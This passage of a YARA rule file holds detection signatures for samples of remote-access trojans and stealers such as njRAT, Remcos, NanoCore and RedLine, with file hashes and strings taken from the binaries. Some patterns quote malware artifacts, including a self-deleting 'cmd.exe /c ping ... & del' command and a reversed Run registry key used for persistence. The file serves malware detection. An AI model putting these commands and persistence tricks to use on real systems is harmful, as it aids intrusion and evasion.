      $s7 = "Enzamlare.GptClassificatoreTransazioni+VB$StateMachine_34_AnalizzaConIA, Gf6yo0x, Version=8.0.2.20, Culture=neutral, PublicKeyTo" ascii /* score: '20.00'*/
      $s8 = "Enzamlare.GptClassificatoreTransazioni+VB$StateMachine_24_AnalizzaTransazione, Gf6yo0x, Version=8.0.2.20, Culture=neutral, Publi" ascii /* score: '20.00'*/
      $s9 = "Enzamlare.GptClassificatoreTransazioni+VB$StateMachine_43_RicercaWebPerDescrizioneAsync, Gf6yo0x, Version=8.0.2.20, Culture=neut" ascii /* score: '20.00'*/
      $s10 = "Enzamlare.GptClassificatoreTransazioni+VB$StateMachine_10_TrovaPatternSimiliAvanzatoConContesto, Gf6yo0x, Version=8.0.2.20, Cult" ascii /* score: '20.00'*/
      $s11 = "Enzamlare.GptClassificatoreTransazioni+VB$StateMachine_8_TrovaPatternSimili, Gf6yo0x, Version=8.0.2.20, Culture=neutral, PublicK" ascii /* score: '20.00'*/
      $s12 = "Enzamlare.GptClassificatoreTransazioni+VB$StateMachine_21_AnalizzaConPrompt, Gf6yo0x, Version=8.0.2.20, Culture=neutral, PublicK" ascii /* score: '20.00'*/
      $s13 = "Enzamlare.GptClassificatoreTransazioni+VB$StateMachine_11_CreaPatternPersonalizzato, Gf6yo0x, Version=8.0.2.20, Culture=neutral," ascii /* score: '20.00'*/
      $s14 = "activity.log" fullword wide /* score: '19.00'*/
      $s15 = "ExecuteStoredProcMsg" fullword wide /* score: '18.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 5000KB and
      8 of them
}

rule njrat_signature__4ea4df5d94204fc550be1874e1b77ea7_imphash_ {
   meta:
      description = "_subset_batch - file njrat(signature)_4ea4df5d94204fc550be1874e1b77ea7(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "cbc366eb88520c2f1a9c0db8a7f5318b4f8a9a0993352a31d877c63e8abc8d0c"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $x2 = "<assemblyIdentity version=\"1.0.0.0\" processorArchitecture=\"*\" name=\"Nullsoft.NSIS.exehead\" type=\"win32\"/><description>Nu" ascii /* score: '31.00'*/
      $s3 = "ntrols\" version=\"6.0.0.0\" processorArchitecture=\"*\" publicKeyToken=\"6595b64144ccf1df\" language=\"*\" /></dependentAssembl" ascii /* score: '25.00'*/
      $s4 = "dency><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivileges><requestedExecutionLevel level=\"asIn" ascii /* score: '22.00'*/
      $s5 = "%s%S.dll" fullword wide /* score: '21.00'*/
      $s6 = "pearten atomy.exe" fullword wide /* score: '19.00'*/
      $s7 = "nstall System v3.01</description><dependency><dependentAssembly><assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common" ascii /* score: '13.00'*/
      $s8 = "=########" fullword ascii /* reversed goodware string '########=' */ /* score: '11.00'*/
      $s9 = "er\" uiAccess=\"false\"/></requestedPrivileges></security></trustInfo><compatibility xmlns=\"urn:schemas-microsoft-com:compatibi" ascii /* score: '10.00'*/
      $s10 = "CRYPTBASE" fullword ascii /* score: '8.50'*/
      $s11 = "urinstinkt" fullword wide /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      1 of ($x*) and all of them
}

rule RemcosRAT_signature__1f23f452093b5c1ff091a2f9fb4fa3e9_imphash_ {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_1f23f452093b5c1ff091a2f9fb4fa3e9(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "c81d4e300c42c6214063a8a73d97715e34b27a3b8624b144ad547dacb8509075"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $x2 = "<assemblyIdentity version=\"1.0.0.0\" processorArchitecture=\"*\" name=\"Nullsoft.NSIS.exehead\" type=\"win32\"/><description>Nu" ascii /* score: '31.00'*/
      $s3 = "ntrols\" version=\"6.0.0.0\" processorArchitecture=\"*\" publicKeyToken=\"6595b64144ccf1df\" language=\"*\" /></dependentAssembl" ascii /* score: '25.00'*/
      $s4 = "dency><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivileges><requestedExecutionLevel level=\"asIn" ascii /* score: '22.00'*/
      $s5 = "%s%S.dll" fullword wide /* score: '21.00'*/
      $s6 = "nstall System v3.03</description><dependency><dependentAssembly><assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common" ascii /* score: '13.00'*/
      $s7 = "er\" uiAccess=\"false\"/></requestedPrivileges></security></trustInfo><compatibility xmlns=\"urn:schemas-microsoft-com:compatibi" ascii /* score: '10.00'*/
      $s8 = "CRYPTBASE" fullword ascii /* score: '8.50'*/
      $s9 = "hhhqeeeo" fullword ascii /* score: '8.00'*/
      $s10 = "jjjzxxx" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      1 of ($x*) and all of them
}

rule RemcosRAT_signature__1f23f452093b5c1ff091a2f9fb4fa3e9_imphash__2a9b619b {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_1f23f452093b5c1ff091a2f9fb4fa3e9(imphash)_2a9b619b.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "2a9b619b9a168e18d3f824e9be8981bf6f629ca33ab68ce56141687dc203d11b"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $x2 = "<assemblyIdentity version=\"1.0.0.0\" processorArchitecture=\"*\" name=\"Nullsoft.NSIS.exehead\" type=\"win32\"/><description>Nu" ascii /* score: '31.00'*/
      $s3 = "ntrols\" version=\"6.0.0.0\" processorArchitecture=\"*\" publicKeyToken=\"6595b64144ccf1df\" language=\"*\" /></dependentAssembl" ascii /* score: '25.00'*/
      $s4 = "dency><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivileges><requestedExecutionLevel level=\"asIn" ascii /* score: '22.00'*/
      $s5 = "%s%S.dll" fullword wide /* score: '21.00'*/
      $s6 = "nstall System v3.03</description><dependency><dependentAssembly><assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common" ascii /* score: '13.00'*/
      $s7 = "er\" uiAccess=\"false\"/></requestedPrivileges></security></trustInfo><compatibility xmlns=\"urn:schemas-microsoft-com:compatibi" ascii /* score: '10.00'*/
      $s8 = "CRYPTBASE" fullword ascii /* score: '8.50'*/
      $s9 = "hhhqeeeo" fullword ascii /* score: '8.00'*/
      $s10 = "jjjzxxx" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      1 of ($x*) and all of them
}

rule QuasarRAT_signature__baa93d47220682c04d92f7797d9224ce_imphash_ {
   meta:
      description = "_subset_batch - file QuasarRAT(signature)_baa93d47220682c04d92f7797d9224ce(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "2c164237de4d5904a66c71843529e37cea5418cdcbc993278329806d97a336a5"
   strings:
      $s1 = "Reporter.exe" fullword wide /* score: '25.00'*/
      $s2 = "      <DpiAwareness xmlns=\"http://schemas.microsoft.com/SMI/2016/WindowsSettings\">PerMonitorV2</DpiAwareness>" fullword ascii /* score: '12.00'*/
      $s3 = "    <asmv3:windowsSettings xmlns=\"http://schemas.microsoft.com/SMI/2005/WindowsSettings\">" fullword ascii /* score: '12.00'*/
      $s4 = "fTpbm^VD" fullword ascii /* score: '9.00'*/
      $s5 = "lhpiuitl" fullword ascii /* score: '8.00'*/
      $s6 = "nalmyrga" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 5000KB and
      all of them
}

rule Rhadamanthys_signature__979d4d3c19bd1d7e944b1ba868d6cce7_imphash_ {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_979d4d3c19bd1d7e944b1ba868d6cce7(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "7e9d74ae0bdebd0a97ca2a85c500236a562e2c7604a14cca705283febd737abc"
   strings:
      $s1 = "/dump\\" fullword ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 9000KB and
      all of them
}

rule Rhadamanthys_signature__979d4d3c19bd1d7e944b1ba868d6cce7_imphash__1e3ac587 {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_979d4d3c19bd1d7e944b1ba868d6cce7(imphash)_1e3ac587.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "1e3ac5879e4cb55c7903ff0fcf3cbcddfb81faaa9e2fa6810ca17302eabd7ee9"
   strings:
      $s1 = "PHP Command Line Interpreter" fullword wide /* score: '14.00'*/
      $s2 = "=.=5{=D$;" fullword ascii /* score: '9.00'*/ /* hex encoded string ']' */
      $s3 = "/getwltsvaXu" fullword ascii /* score: '9.00'*/
      $s4 = "SPYq%b{" fullword ascii /* score: '9.00'*/
      $s5 = "* &$)>" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 9000KB and
      all of them
}

rule Rhadamanthys_signature__979d4d3c19bd1d7e944b1ba868d6cce7_imphash__a8b9acc8 {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_979d4d3c19bd1d7e944b1ba868d6cce7(imphash)_a8b9acc8.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "a8b9acc89b79999ac9ff94155b6d040b56134d446f6ca934dc000ae8c09c9e9c"
   strings:
      $s1 = "creation2.exe" fullword wide /* score: '22.00'*/
      $s2 = "2E\"3D#@<?" fullword ascii /* score: '9.00'*/ /* hex encoded string '.=' */
   condition:
      uint16(0) == 0x5a4d and filesize < 8000KB and
      all of them
}

rule PureHVNC_signature__a56f115ee5ef2625bd949acaeec66b76_imphash__f709e006 {
   meta:
      description = "_subset_batch - file PureHVNC(signature)_a56f115ee5ef2625bd949acaeec66b76(imphash)_f709e006.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "f709e006cd98347787d9fef1ca3420b5fd6137ad51df53cb90bcc6467784d9af"
   strings:
      $s1 = "HholzTools_WMITv804760675.exe" fullword wide /* score: '19.00'*/
      $s2 = "       Makes the application long-path aware. See https://docs.microsoft.com/windows/win32/fileio/maximum-file-path-limitation -" ascii /* score: '17.00'*/
      $s3 = "      <dpiAware xmlns=\"http://schemas.microsoft.com/SMI/2005/WindowsSettings\">true</dpiAware>" fullword ascii /* score: '12.00'*/
      $s4 = "       Makes the application long-path aware. See https://docs.microsoft.com/windows/win32/fileio/maximum-file-path-limitation -" ascii /* score: '12.00'*/
      $s5 = "        <requestedExecutionLevel level=\"requireAdministrator\" uiAccess=\"false\" />" fullword ascii /* score: '11.00'*/
      $s6 = "             requestedExecutionLevel node with one of the following." fullword ascii /* score: '11.00'*/
      $s7 = "       to opt in. Windows Forms applications targeting .NET Framework 4.6 that opt into this setting, should " fullword ascii /* score: '11.00'*/
      $s8 = "            Specifying requestedExecutionLevel element will disable file and registry virtualization. " fullword ascii /* score: '11.00'*/
      $s9 = "!!!- 9" fullword ascii /* score: '10.00'*/
      $s10 = "c:\\mirn" fullword ascii /* score: '10.00'*/
      $s11 = "LC+ -8" fullword ascii /* score: '9.00'*/
      $s12 = "* ,gFV" fullword ascii /* score: '9.00'*/
      $s13 = "s(* /D" fullword ascii /* score: '9.00'*/
      $s14 = "* JW+j" fullword ascii /* score: '9.00'*/
      $s15 = "TfaLoGf=" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 31000KB and
      8 of them
}

rule Rhadamanthys_signature__979d4d3c19bd1d7e944b1ba868d6cce7_imphash__a34b6a0f {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_979d4d3c19bd1d7e944b1ba868d6cce7(imphash)_a34b6a0f.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "a34b6a0f667b145a5034d2a7c0cd96eb1636b0ba98055c490dce3fc3fa89d2a9"
   strings:
      $s1 = "PHP Command Line Interpreter" fullword wide /* score: '14.00'*/
      $s2 = "GlOGR;a" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 8000KB and
      all of them
}

rule njrat_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash_ {
   meta:
      description = "_subset_batch - file njrat(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "4071fc34aeb8f79be01d87c119c4e47c8367916c71c0f75e618f3de0e0e5edef"
   strings:
      $x1 = "cmd.exe /c ping 0 -n 2 & del \"" fullword wide /* score: '42.00'*/
      $s2 = "Execute ERROR" fullword wide /* PEStudio Blacklist: strings */ /* score: '26.00'*/
      $s3 = "Execute ERROR " fullword wide /* score: '21.00'*/
      $s4 = "Download ERROR" fullword wide /* PEStudio Blacklist: strings */ /* score: '18.00'*/
      $s5 = "Executed As " fullword wide /* score: '18.00'*/
      $s6 = "processInformationLength" fullword ascii /* score: '15.00'*/
      $s7 = "SGFjS2VkX2J5X2FsM256aWk=" fullword wide /* base64 encoded string 'HacKed_by_al3nzii' */ /* score: '14.00'*/
      $s8 = "getvalue" fullword wide /* score: '13.00'*/
      $s9 = "Update ERROR" fullword wide /* PEStudio Blacklist: strings */ /* score: '12.00'*/
      $s10 = "processInformationClass" fullword ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 70KB and
      1 of ($x*) and all of them
}

rule njrat_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__ca9887cb {
   meta:
      description = "_subset_batch - file njrat(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_ca9887cb.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "ca9887cbe15fed624a91da0c3bd53dbd38ae693b61703e3a6b7d6be2916fb650"
   strings:
      $x1 = "cmd.exe /c ping 0 -n 2 & del \"" fullword wide /* score: '42.00'*/
      $s2 = "Execute ERROR" fullword wide /* PEStudio Blacklist: strings */ /* score: '26.00'*/
      $s3 = "Stub.exe" fullword ascii /* score: '22.00'*/
      $s4 = "Execute ERROR " fullword wide /* score: '21.00'*/
      $s5 = "WScript.Shell" fullword wide /* PEStudio Blacklist: strings */ /* score: '20.00'*/
      $s6 = "Executed As " fullword wide /* score: '18.00'*/
      $s7 = "Fixer.bat" fullword wide /* score: '18.00'*/
      $s8 = "processInformationLength" fullword ascii /* score: '15.00'*/
      $s9 = "nuR\\noisreVtnerruC\\swodniW\\tfosorciM\\erawtfoS" fullword wide /* reversed goodware string 'Software\\Microsoft\\Windows\\CurrentVersion\\Run' */ /* score: '14.00'*/
      $s10 = "getvalue" fullword wide /* score: '13.00'*/
      $s11 = "processInformationClass" fullword ascii /* score: '11.00'*/
      $s12 = "[+] System : " fullword wide /* score: '11.00'*/
      $s13 = "information ------------------------------" fullword wide /* score: '8.00'*/
      $s14 = "[+] Host   : " fullword wide /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 80KB and
      1 of ($x*) and 4 of them
}

rule RemcosRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__5e355fdb {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_5e355fdb.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "5e355fdbf33209687a00f924bda25b29a71065a072eafae63fbcf8076358e74a"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"utf-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '33.00'*/
      $s2 = "questedPrivileges xmlns=\"urn:schemas-microsoft-com:asm.v3\"><requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\" /><" ascii /* score: '26.00'*/
      $s3 = "Miro.exe" fullword wide /* score: '22.00'*/
      $s4 = "<assemblyIdentity version=\"1.0.0.0\" name=\"MyApplication.app\" /><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v2\"><securi" ascii /* score: '14.00'*/
      $s5 = "KIRYiRC" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      1 of ($x*) and all of them
}

rule njrat_signature__9f4693fc0c511135129493f2161d1e86_imphash_ {
   meta:
      description = "_subset_batch - file njrat(signature)_9f4693fc0c511135129493f2161d1e86(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "2e7d42cbdb12b7814157bb6b24a6e682b66a2e0e8b2969cae4b3623bec8a9217"
   strings:
      $s1 = "<)<2<><E<" fullword ascii /* score: '9.00'*/ /* hex encoded string '.' */
      $s2 = "Delphi-the best. Fuck off all the rest. Neshta 1.0 Made in Belarus. " fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 6000KB and
      all of them
}

rule QuasarRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__e2c14df7 {
   meta:
      description = "_subset_batch - file QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_e2c14df7.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "e2c14df722dfbb0c3a8c4228034f37ba6395babc29ad2aa9f4a175f37a839831"
   strings:
      $x1 = "temploader.exe" fullword ascii /* score: '38.00'*/
      $s2 = "temploader" fullword ascii /* score: '24.00'*/
      $s3 = "=QpUspys" fullword ascii /* score: '9.00'*/
      $s4 = "5HeyEXU=" fullword ascii /* score: '9.00'*/
      $s5 = "@ZV -k,iQMGzoV" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 6000KB and
      1 of ($x*) and all of them
}

rule NanoCore_signature__6ed4f5f04d62b18d96b26d6db7c18840_imphash_ {
   meta:
      description = "_subset_batch - file NanoCore(signature)_6ed4f5f04d62b18d96b26d6db7c18840(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "7d17ba41ab2d4cd013658e2d46d40ead827b2b33be55f038fad1fc188f08ef7a"
   strings:
      $s1 = "gcwetkeylen" fullword ascii /* score: '11.00'*/
      $s2 = "9\"pNYN2%d%" fullword ascii /* score: '11.00'*/
      $s3 = "9acceu:\"" fullword ascii /* score: '10.00'*/
      $s4 = "C@x.cmd" fullword ascii /* score: '9.00'*/
      $s5 = "* ':\\e" fullword ascii /* score: '9.00'*/
      $s6 = "|n>urdllstupv" fullword ascii /* score: '9.00'*/
      $s7 = "<ftpgc gp " fullword ascii /* score: '9.00'*/
      $s8 = ",|2 0};\\" fullword ascii /* score: '9.00'*/ /* hex encoded string ' ' */
      $s9 = "bpchfdn" fullword ascii /* score: '8.00'*/
      $s10 = "ghijklm" fullword ascii /* score: '8.00'*/
      $s11 = "abglsypval" fullword ascii /* score: '8.00'*/
      $s12 = "evelimit" fullword ascii /* score: '8.00'*/
      $s13 = "splusrec" fullword ascii /* score: '8.00'*/
      $s14 = "\"X#%S%Y" fullword ascii /* score: '8.00'*/
      $s15 = "rsvbaseitp" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 7000KB and
      8 of them
}

rule NanoCore_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash_ {
   meta:
      description = "_subset_batch - file NanoCore(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "eda128c2be30349721286d162089e9bd3d4d956e06c902d25826a6364c641404"
   strings:
      $x1 = "C:\\Users\\Administrator\\Desktop\\Client\\Temp\\VeujJKrcDe\\src\\obj\\Debug\\YaQS.pdb" fullword ascii /* score: '40.00'*/
      $s2 = "fSystem.Drawing.Icon, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3ahSystem.Drawing.Bitmap, S" ascii /* score: '27.00'*/
      $s3 = "hSystem.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPAD=Et|" fullword ascii /* score: '27.00'*/
      $s4 = "fSystem.Drawing.Icon, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3agSystem.Drawing.Point, Sy" ascii /* score: '27.00'*/
      $s5 = "stem.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3ahSystem.Drawing.Bitmap, System.Drawing, Version=4" ascii /* score: '27.00'*/
      $s6 = "fSystem.Drawing.Icon, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3agSystem.Drawing.Point, Sy" ascii /* score: '27.00'*/
      $s7 = "ystem.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPADPBj" fullword ascii /* score: '24.00'*/
      $s8 = "YaQS.exe" fullword wide /* score: '22.00'*/
      $s9 = "Select * From Table_Secretarys Where SecretaryTC=@p1 and SecretaryPassword=@p2" fullword wide /* score: '19.00'*/
      $s10 = "The deletion process failed" fullword wide /* score: '18.00'*/
      $s11 = "Select * from Table_Patients where PatientTC=@p1 and PatientPassWord=@p2" fullword wide /* score: '16.00'*/
      $s12 = "btnLogin" fullword wide /* score: '15.00'*/
      $s13 = "btnLogin_Click" fullword ascii /* score: '15.00'*/
      $s14 = "The deletion process is successful" fullword wide /* score: '15.00'*/
      $s15 = ".0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPADPBj" fullword ascii /* score: '13.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      1 of ($x*) and 4 of them
}

rule RedLineStealer_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__3607fd0c {
   meta:
      description = "_subset_batch - file RedLineStealer(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_3607fd0c.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "3607fd0cfc697f5bf199cb1d2fc707536aaeb0c21af2bb5b9c79fe15b58eb958"
   strings:
      $x1 = "C:\\Users\\Administrator\\Desktop\\Client\\Temp\\wPUeKSxDJt\\src\\obj\\Debug\\BQnS.pdb" fullword ascii /* score: '40.00'*/
      $s2 = "fSystem.Drawing.Icon, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3ahSystem.Drawing.Bitmap, S" ascii /* score: '27.00'*/
      $s3 = "ystem.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPADPBj" fullword ascii /* score: '24.00'*/
      $s4 = "BQnS.exe" fullword wide /* score: '22.00'*/
      $s5 = "daybreak.exe" fullword wide /* score: '22.00'*/
      $s6 = "DaybreakDX.exe" fullword wide /* score: '22.00'*/
      $s7 = "/config.dat" fullword wide /* score: '14.00'*/
      $s8 = "/addresslist.txt" fullword wide /* score: '14.00'*/
      $s9 = "getAddresses" fullword ascii /* score: '12.00'*/
      $s10 = "getCurrentListAddress" fullword ascii /* score: '12.00'*/
      $s11 = "HigurashiDaybreakConfig.FormMyConf.resources" fullword ascii /* score: '10.00'*/
      $s12 = "HigurashiDaybreakConfig.FormConfig.resources" fullword ascii /* score: '10.00'*/
      $s13 = "config.json" fullword wide /* score: '10.00'*/
      $s14 = "getChat" fullword ascii /* score: '9.00'*/
      $s15 = "getVolsound" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      1 of ($x*) and 4 of them
}

rule RedLineStealer_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__a666d203 {
   meta:
      description = "_subset_batch - file RedLineStealer(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_a666d203.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "a666d2038b960b6dc3399f02409739c56ee999ff20ff2eb58f8b8e9543943c7e"
   strings:
      $s1 = "WzAx.exe" fullword wide /* score: '22.00'*/
      $s2 = "EventTracker_{0:yyyyMMdd}.log" fullword wide /* score: '19.00'*/
      $s3 = "C:\\EventTracker\\Logs" fullword wide /* score: '18.00'*/
      $s4 = "Event Tracker Export - {0:yyyy-MM-dd HH:mm:ss}" fullword wide /* score: '18.00'*/
      $s5 = "systemLogger" fullword ascii /* score: '17.00'*/
      $s6 = "SystemLogger" fullword wide /* score: '17.00'*/
      $s7 = "Failed to initialize logger: " fullword wide /* score: '17.00'*/
      $s8 = "SystemLogger shutting down" fullword wide /* score: '17.00'*/
      $s9 = "EventTracker_*.log" fullword wide /* score: '16.00'*/
      $s10 = "GetEventDescription" fullword ascii /* score: '15.00'*/
      $s11 = "System Event Tracker - Main" fullword wide /* score: '15.00'*/
      $s12 = "Time Range: {0:MM/dd/yyyy HH:mm} - {1:MM/dd/yyyy HH:mm}" fullword wide /* score: '15.00'*/
      $s13 = "WzAx.pdb" fullword ascii /* score: '14.00'*/
      $s14 = "get_EnableLogging" fullword ascii /* score: '14.00'*/
      $s15 = "<GetWindowsEventLogEvents>b__4_0" fullword ascii /* score: '14.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      8 of them
}

rule RemcosRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__ead9f443 {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_ead9f443.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "ead9f443d43e6c9548964721edbf937b1cdf9b5d6126682714de2aba4a086078"
   strings:
      $s1 = "fSystem.Drawing.Icon, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3ahSystem.Drawing.Bitmap, S" ascii /* score: '27.00'*/
      $s2 = "ystem.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPADPBj" fullword ascii /* score: '24.00'*/
      $s3 = "pWQm.exe" fullword wide /* score: '22.00'*/
      $s4 = "<ProcessClientRequests>b__4" fullword ascii /* score: '15.00'*/
      $s5 = "<ProcessClientRequests>b__2" fullword ascii /* score: '15.00'*/
      $s6 = "<ProcessClientRequests>b__1" fullword ascii /* score: '15.00'*/
      $s7 = "<ProcessClientRequests>b__18_3" fullword ascii /* score: '15.00'*/
      $s8 = "<ProcessClientRequests>b__0" fullword ascii /* score: '15.00'*/
      $s9 = "ProcessClientRequests" fullword ascii /* score: '15.00'*/
      $s10 = "<ProcessClientRequests>b__18_5" fullword ascii /* score: '15.00'*/
      $s11 = "../../../Resources/7z.dll" fullword wide /* score: '15.00'*/
      $s12 = "Problem processing client requests. " fullword wide /* score: '15.00'*/
      $s13 = "Finished processing client requests for client: " fullword wide /* score: '15.00'*/
      $s14 = "Send Command" fullword wide /* score: '14.00'*/
      $s15 = "_clientCommandTextBox" fullword wide /* score: '12.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      8 of them
}

rule RedLineStealer_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__4b6dcc79 {
   meta:
      description = "_subset_batch - file RedLineStealer(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_4b6dcc79.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "4b6dcc799cd2d6c6b6ddcef43e8e29bf6fa4ddd676959bd713f093b7143c0b8b"
   strings:
      $s1 = "hSystem.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPADf" fullword ascii /* score: '27.00'*/
      $s2 = "ErrorReporter_{0:yyyyMMdd}.log" fullword wide /* score: '25.00'*/
      $s3 = "Process Information - " fullword wide /* score: '23.00'*/
      $s4 = "Process hang detected - no stack trace available" fullword wide /* score: '23.00'*/
      $s5 = "PDsy.exe" fullword wide /* score: '22.00'*/
      $s6 = "<GetMonitoredProcesses>b__19_0" fullword ascii /* score: '20.00'*/
      $s7 = "GetMonitoredProcesses" fullword ascii /* score: '20.00'*/
      $s8 = "https://crashreports.example.com/api/submit" fullword wide /* score: '20.00'*/
      $s9 = "CrashMonitor_{0:yyyyMMdd}.log" fullword wide /* score: '19.00'*/
      $s10 = "SELECT * FROM Win32_Process WHERE ProcessId = {0}" fullword wide /* score: '19.00'*/
      $s11 = "CrashMonitor.ProcessListForm.resources" fullword ascii /* score: '18.00'*/
      $s12 = "Error loading processes: " fullword wide /* score: '18.00'*/
      $s13 = "Error terminating process: " fullword wide /* score: '18.00'*/
      $s14 = "Error retrieving process information: " fullword wide /* score: '18.00'*/
      $s15 = "Error refreshing process list: " fullword wide /* score: '18.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule NanoCore_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__339d2c7c {
   meta:
      description = "_subset_batch - file NanoCore(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_339d2c7c.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
